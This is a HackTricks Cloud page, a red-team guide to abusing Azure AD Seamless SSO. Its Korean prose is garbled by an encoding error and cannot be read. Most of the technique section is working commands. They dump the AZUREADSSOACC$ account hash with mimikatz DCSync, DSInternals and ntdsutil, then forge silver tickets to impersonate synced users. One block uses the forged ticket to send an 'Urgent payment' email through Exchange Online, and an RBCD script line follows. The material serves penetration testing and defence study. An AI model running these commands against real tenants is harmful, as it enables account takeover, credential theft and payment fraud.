# Az - Seamless SSO

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## ê¸°ë³¸ ì •ë³´

[ë¬¸ì„œì—ì„œ ë°œì·Œ:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO)ëŠ” **ê¸°ì—… ë„¤íŠ¸ì›Œí¬ì— ì—°ê²°ëœ ê¸°ì—… ì¥ì¹˜ì—ì„œ ì‚¬ìš©ìë¥¼ ìë™ìœ¼ë¡œ ë¡œê·¸ì¸**ì‹œí‚µë‹ˆë‹¤. í™œì„±í™”ë˜ë©´, **ì‚¬ìš©ìëŠ” Azure ADì— ë¡œê·¸ì¸í•  ë•Œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•  í•„ìš”ê°€ ì—†ìœ¼ë©°**, ë³´í†µ ì‚¬ìš©ì ì´ë¦„ë„ ì…ë ¥í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ ì¶”ê°€ì ì¸ ì˜¨í”„ë ˆë¯¸ìŠ¤ êµ¬ì„± ìš”ì†Œ ì—†ì´ í´ë¼ìš°ë“œ ê¸°ë°˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì‰½ê²Œ ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.

<figure><img src="../../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

ê¸°ë³¸ì ìœ¼ë¡œ Azure AD Seamless SSOëŠ” **ì˜¨í”„ë ˆë¯¸ìŠ¤ ë„ë©”ì¸ì— ê°€ì…ëœ PC**ì—ì„œ **ì‚¬ìš©ìë¥¼ ë¡œê·¸ì¸**ì‹œí‚µë‹ˆë‹¤.

ì´ëŠ” [**PHS (Password Hash Sync)**](phs-password-hash-sync.md)ì™€ [**PTA (Pass-through Authentication)**](pta-pass-through-authentication.md) ëª¨ë‘ì—ì„œ ì§€ì›ë©ë‹ˆë‹¤.

ë°ìŠ¤í¬íƒ‘ SSOëŠ” ì¸ì¦ì„ ìœ„í•´ **Kerberos**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì„¤ì • ì‹œ, Azure AD ConnectëŠ” ì˜¨í”„ë ˆë¯¸ìŠ¤ ADì— **AZUREADSSOACC`$`ë¼ëŠ” ì»´í“¨í„° ê³„ì •ì„ ìƒì„±**í•©ë‹ˆë‹¤. `AZUREADSSOACC$` ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ëŠ” ì„¤ì • ì¤‘ì— **í‰ë¬¸ìœ¼ë¡œ Azure ADì— ì „ì†¡**ë©ë‹ˆë‹¤.

**Kerberos í‹°ì¼“**ì€ ë¹„ë°€ë²ˆí˜¸ì˜ **NTHash (MD4)**ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì•”í˜¸í™”**ë˜ë©°, Azure ADëŠ” ì „ì†¡ëœ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ì—¬ í‹°ì¼“ì„ ë³µí˜¸í™”í•©ë‹ˆë‹¤.

**Azure AD**ëŠ” Kerberos **í‹°ì¼“**ì„ ìˆ˜ë½í•˜ëŠ” **ì—”ë“œí¬ì¸íŠ¸**(https://autologon.microsoftazuread-sso.com)ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤. ë„ë©”ì¸ì— ê°€ì…ëœ ê¸°ê¸°ì˜ ë¸Œë¼ìš°ì €ëŠ” SSOë¥¼ ìœ„í•´ ì´ ì—”ë“œí¬ì¸íŠ¸ë¡œ í‹°ì¼“ì„ ì „ë‹¬í•©ë‹ˆë‹¤.

### ì˜¨í”„ë ˆë¯¸ìŠ¤ -> í´ë¼ìš°ë“œ

ì‚¬ìš©ì **`AZUREADSSOACC$`ì˜ ë¹„ë°€ë²ˆí˜¸ëŠ” ì ˆëŒ€ ë³€ê²½ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ ë„ë©”ì¸ ê´€ë¦¬ìëŠ” ì´ ê³„ì •ì˜ **í•´ì‹œë¥¼ íƒˆì·¨**í•˜ì—¬ **ì–´ë–¤ ì˜¨í”„ë ˆë¯¸ìŠ¤ ì‚¬ìš©ìì™€ë„ ë™ê¸°í™”ëœ** Azureì— ì—°ê²°í•˜ê¸° ìœ„í•´ **ì‹¤ë²„ í‹°ì¼“ì„ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifmâ€ "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
ì´ì œ í•´ì‹œë¥¼ ì‚¬ìš©í•˜ì—¬ **silver tickets ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
ì€ í‹°ì¼“ì„ ì‚¬ìš©í•˜ë ¤ë©´ ë‹¤ìŒ ë‹¨ê³„ë¥¼ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤:

1. **ë¸Œë¼ìš°ì € ì‹œì‘:** Mozilla Firefoxë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
2. **ë¸Œë¼ìš°ì € êµ¬ì„±:**
* **`about:config`**ë¡œ ì´ë™í•©ë‹ˆë‹¤.
* [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication)ì˜ ì„¤ì •ì„ ì§€ì •ëœ [ê°’](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically)ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤:
* `https://aadg.windows.net.nsatc.net`
* `https://autologon.microsoftazuread-sso.com`
3. **ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì ‘ê·¼:**
* ì¡°ì§ì˜ AAD ë„ë©”ì¸ê³¼ í†µí•©ëœ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë°©ë¬¸í•©ë‹ˆë‹¤. ì¼ë°˜ì ì¸ ì˜ˆëŠ” [Office 365](https://portal.office.com/)ì…ë‹ˆë‹¤.
4. **ì¸ì¦ ê³¼ì •:**
* ë¡œê·¸ì¸ í™”ë©´ì—ì„œ ì‚¬ìš©ì ì´ë¦„ì„ ì…ë ¥í•˜ê³  ë¹„ë°€ë²ˆí˜¸ í•„ë“œëŠ” ë¹„ì›Œë‘¡ë‹ˆë‹¤.
* ê³„ì†í•˜ë ¤ë©´ TAB ë˜ëŠ” ENTERë¥¼ ëˆ„ë¦…ë‹ˆë‹¤.

{% hint style="success" %}
ì´ ë°©ë²•ì€ MFAê°€ í™œì„±í™”ëœ ê²½ìš° ì´ë¥¼ ìš°íšŒí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
{% endhint %}

#### ~~í´ë¼ìš°ë“œ ì „ìš© ì‚¬ìš©ìì— ëŒ€í•œ Kerberos í‹°ì¼“ ìƒì„±~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

Active Directory ê´€ë¦¬ìê°€ Azure AD Connectì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´, **í´ë¼ìš°ë“œ ì‚¬ìš©ìì— ëŒ€í•´ SIDë¥¼ ì„¤ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ Kerberos **í‹°ì¼“**ì„ **í´ë¼ìš°ë“œ ì „ìš© ì‚¬ìš©ì**ì— ëŒ€í•´ì„œë„ **ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìœ ì¼í•œ ìš”êµ¬ ì‚¬í•­ì€ SIDê°€ ì ì ˆí•œ [SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\))ì—¬ì•¼ í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

{% hint style="danger" %}
í´ë¼ìš°ë“œ ì „ìš© ê´€ë¦¬ì ì‚¬ìš©ìì˜ SID ë³€ê²½ì€ ì´ì œ **Microsoftì— ì˜í•´ ì°¨ë‹¨**ë˜ì—ˆìŠµë‹ˆë‹¤.\
ìì„¸í•œ ì •ë³´ëŠ” [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)ì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.
{% endhint %}

### ì˜¨í”„ë ˆë¯¸ìŠ¤ -> í´ë¼ìš°ë“œ ë¦¬ì†ŒìŠ¤ ê¸°ë°˜ ì œí•œ ìœ„ì„ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

ì´ ê³„ì •ì´ ìˆëŠ” ì»¨í…Œì´ë„ˆ ë˜ëŠ” OUì—ì„œ ì»´í“¨í„° ê³„ì •(`AZUREADSSOACC$`)ì„ ê´€ë¦¬í•  ìˆ˜ ìˆëŠ” ì‚¬ëŒì€ **ê³„ì •ì— ëŒ€í•´ ë¦¬ì†ŒìŠ¤ ê¸°ë°˜ ì œí•œ ìœ„ì„ì„ êµ¬ì„±í•˜ê³  ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
```python
python rbdel.py -u <workgroup>\\<user> -p <pass> <ip> azureadssosvc$
```
## ì°¸ê³  ìë£Œ

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg)

{% hint style="success" %}
AWS Hacking ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
